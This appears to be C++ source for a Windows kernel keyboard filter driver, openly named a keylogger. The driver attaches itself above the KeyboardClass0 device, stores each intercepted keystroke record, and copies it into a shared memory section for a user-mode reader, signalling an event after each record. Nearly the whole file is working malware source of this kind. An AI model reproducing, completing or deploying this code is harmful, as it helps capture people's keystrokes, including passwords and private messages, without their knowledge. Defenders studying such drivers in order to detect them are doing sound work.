#include "KeyloggerCore.hpp"


KeyloggerCore::KeyloggerCore(PDRIVER_OBJECT DriverObject)
    : DriverObject_(DriverObject),
      LowerDeviceObject_(nullptr),
      DeviceObject_(nullptr),
      Event_(nullptr),
      workItem_(nullptr),
      SectionHandle_(nullptr),
      sectionBaseAddress_(nullptr),
      sectionViewSize_(0),
      keyboardInfo_ {0}
{
    KdPrint(("\nDeviceName: %wZ\n", &deviceName_));
    KdPrint(("\nsymbolicName: %wZ\n", &symbolicName_));
}



KeyloggerCore::~KeyloggerCore()
{
    IoDeleteSymbolicLink(&symbolicName_);

    if (LowerDeviceObject_ != nullptr)
        IoDetachDevice(LowerDeviceObject_);

    if (workItem_ != nullptr)
        IoFreeWorkItem(workItem_);

    ZwClose(Event_);

    if (DeviceObject_ != nullptr)
        IoDeleteDevice(DeviceObject_);
}



NTSTATUS KeyloggerCore::CreateDevice()
{
    auto status = STATUS_SUCCESS;

    status = IoCreateSymbolicLink(&symbolicName_, &deviceName_);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("IoCreateSymbolicLink was failed create symbolic link... Status: 0x%ul\n", status));
        return status;
    }

    status = IoCreateDevice(
        DriverObject_,
        0,
        &deviceName_,
        FILE_DEVICE_KEYBOARD,
        FILE_DEVICE_SECURE_OPEN,
        TRUE,
        &DeviceObject_
    );
    if (!NT_SUCCESS(status))
    {
        KdPrint(("IoCreateDevice was failed create device... Status: 0x%ul\n", status));
        return status;
    }

    return status;
}



NTSTATUS KeyloggerCore::AddtachToDevice()
{
    DeviceObject_->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
    DeviceObject_->Flags &= ~DO_DEVICE_INITIALIZING;

    UNICODE_STRING targetDeviceName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
    auto status = STATUS_SUCCESS;

    // Memory for LowerDeviceObject_, will allocating in non-paged pool.
    status = IoAttachDevice(DeviceObject_, &targetDeviceName, &LowerDeviceObject_);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("IoAttachDevice was failed attach to device... Status: 0x%ul\n", status));
        return status;
    }

    return status;
}



NTSTATUS KeyloggerCore::InitWorkItem()
{
    ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);

    workItem_ = IoAllocateWorkItem(DeviceObject_);
    if (workItem_ == nullptr)
    {
        KdPrint(("IoAllocateWorkItem was failed allocated memory...\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    return STATUS_SUCCESS;
}



void KeyloggerCore::SetEvent()
{
    IoQueueWorkItem(
        workItem_,
        ::SetEventWorkItem,
        DelayedWorkQueue,
        this
    );
}



void KeyloggerCore::InitEvent(PVOID Event)
{
    Event_ = static_cast<PKEVENT>(Event);
}



PKEVENT KeyloggerCore::getEvent() const
{
    return Event_;
}



NTSTATUS KeyloggerCore::OpenSection()
{
    OBJECT_ATTRIBUTES obj;
    auto status = STATUS_SUCCESS;

    InitializeObjectAttributes(
        &obj,
        &sectionName_,
        OBJ_CASE_INSENSITIVE,
        nullptr,
        nullptr
    );

    
    status = ZwOpenSection(
        &SectionHandle_,
        SECTION_MAP_READ | SECTION_MAP_WRITE,
        &obj
    );
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ZwOpenSection was failed: Status: 0x%ul\n", status));
        return status;
    }

    status = ZwMapViewOfSection(
        SectionHandle_,
        NtCurrentProcess(),
        &sectionBaseAddress_,
        0,
        PAGE_SIZE,
        nullptr,
        &sectionViewSize_,
        SECTION_INHERIT::ViewShare,
        0,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ZwMapViewOfSection was failed: Status: 0x%ul\n", status));
        return status;
    }


    return status;
}



NTSTATUS KeyloggerCore::CloseSection() const
{
    auto status = STATUS_SUCCESS;
    if (SectionHandle_ == nullptr || sectionBaseAddress_ == nullptr)
        return STATUS_ACCESS_VIOLATION;

    status = ZwUnmapViewOfSection(NtCurrentProcess(), sectionBaseAddress_);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ZwUnmapViewOfSection was failed: Status: 0x%ul\n", status));
        return status;
    }

    status = ZwClose(SectionHandle_);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("ZwClose was failed: Status: 0x%ul\n", status));
        return status;
    }

    return status;
}



PVOID KeyloggerCore::getSectionBaseAddr() const
{
    return sectionBaseAddress_;
}



void KeyloggerCore::saveKeyboardInfo(PKEYBOARD_INPUT_DATA info)
{
    keyboardInfo_ = *info;
}



PKEYBOARD_INPUT_DATA KeyloggerCore::getKeyboardInfo()
{
    return &keyboardInfo_;
}



PUNICODE_STRING KeyloggerCore::getDriverName()
{
    return &deviceName_;
}



PUNICODE_STRING KeyloggerCore::getSymbolicName()
{
    return &symbolicName_;
}



PDRIVER_OBJECT KeyloggerCore::getDriverObject() const
{
    return DriverObject_;
}



PDEVICE_OBJECT KeyloggerCore::getDeviceObject() const
{
    return DeviceObject_;
}



PDEVICE_OBJECT KeyloggerCore::getLowerDeviceObject() const
{
    return LowerDeviceObject_;
}



_Use_decl_annotations_
void ::SetEventWorkItem([[maybe_unused]] PDEVICE_OBJECT DeviceObject, PVOID Context)
{
    ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);
    if (Context == nullptr)
        ExRaiseAccessViolation();

    auto logger_ = static_cast<KeyloggerCore*>(Context);

    // Driver is executed in the context of an arbitrary thread (context switching).
    auto status = logger_->OpenSection();
    if (!NT_SUCCESS(status))
        return;

    RtlCopyMemory(
        logger_->getSectionBaseAddr(), 
        logger_->getKeyboardInfo(), 
        sizeof(KEYBOARD_INPUT_DATA)
    );

    status = logger_->CloseSection();
    if (!NT_SUCCESS(status))
        return;


    KeSetEvent(logger_->getEvent(), IO_NO_INCREMENT, FALSE);
}
